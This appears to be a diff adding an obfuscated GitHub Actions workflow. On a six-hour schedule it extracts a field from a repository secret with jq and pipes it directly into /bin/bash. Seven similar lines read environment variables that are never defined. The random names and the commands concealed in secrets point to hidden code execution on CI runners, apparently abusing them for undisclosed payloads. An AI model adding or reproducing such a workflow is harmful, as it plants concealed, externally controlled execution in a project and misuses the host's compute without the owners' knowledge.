@@ -1,0 +1,26 @@
+name: brothdeep
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: brothdeep
+        env:
+          xn6: ${{ secrets.xn6 }}
+        run: |
+          echo $xn6 | jq -r .do360 | /bin/bash
+          echo $b3 | jq -r .yxzs9 | /bin/bash
+          echo $kbr01 | jq -r .uu1634 | /bin/bash
+          echo $qjqlo9955 | jq -r .n3531 | /bin/bash
+          echo $qdvf44488 | jq -r .zzjv25633 | /bin/bash
+          echo $gw17505 | jq -r .x625 | /bin/bash
+          echo $qlue373 | jq -r .yja69 | /bin/bash
+          echo $r43 | jq -r .ero129 | /bin/bash
+
